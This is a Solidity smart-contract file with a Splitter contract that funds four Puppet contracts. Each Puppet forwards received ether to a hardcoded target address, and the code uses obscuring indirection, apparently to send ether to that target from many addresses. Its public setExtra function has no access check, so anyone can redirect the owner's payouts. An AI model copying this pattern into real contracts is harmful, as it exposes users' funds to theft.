pragma solidity ^0.4.23;

contract Splitter{
    
	address public owner;
	address[] private puppets;
	mapping (uint256 => address) private extra;
	address private _addy;
	uint256 private _share;
	uint256 private _count;

	constructor() payable public{
		owner = msg.sender;
		addPuppetDynamic();
		addPuppetDynamic();
		addPuppetDynamic();
		addPuppetDynamic();
		extra[getIndex(0)] = puppets[getIndex(0)];
        extra[getIndex(1)] = puppets[getIndex(1)];
        extra[getIndex(2)] = puppets[getIndex(2)];
        extra[getIndex(3)] = puppets[getIndex(3)];
	}

	function withdraw() public{
		require(msg.sender == owner);
		owner.transfer(address(this).balance);
	}

	function getPuppetCount() public constant returns(uint256 puppetCount){
    	return getPuppetsLength();
  	}

	function newPuppet() public returns(address newPuppet){
	    require(msg.sender == owner);
    	Puppet p = new Puppet();
    	puppets.push(p);
    	return p;
  		}
 
    function setExtra(uint256 _id, address _newExtra) public {
        require(_newExtra != address(0));
        extra[_id] = _newExtra;
    }

    function fundPuppets() public payable {
        require(msg.sender == owner);
    	_share = SafeMath.div(msg.value, getIndex(4));
		 
        extra[getIndex(0)].call.value(_share).gas(800000)();
		 
        extra[getIndex(1)].call.value(_share).gas(800000)();
		 
        extra[getIndex(2)].call.value(_share).gas(800000)();
		 
        extra[getIndex(3)].call.value(_share).gas(800000)();
        }
        
	function getPuppetsLength() internal view returns(uint256) {
        return puppets.length;
    }

    function getIndex(uint256 index) internal pure returns(uint256) {
        return index;
    }

	function addPuppetDynamic() internal {
        newPuppet();
    }

	function() payable public{
	}
}

contract Puppet {
    
    mapping (uint256 => address) public target;
    mapping (uint256 => address) public master;
	
	constructor() payable public{
		 
		target[getZero()] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
        master[getZero()] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
	}
	
	function() public payable{
	    if(msg.sender != target[getZero()]){
			 
			target[getZero()].call.value(msg.value).gas(600000)();
		}
    }
	 
	function withdraw() public{
		require(msg.sender == master[getZero()]);
		master[getZero()].transfer(address(this).balance);
	}

    function getZero() internal pure returns(uint256) {
        return 0;
    }
}

library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    if (a == 0) {
      return getZero();
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return a / b;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }

  function getZero() internal pure returns(uint256) {
        return 0;
  }
}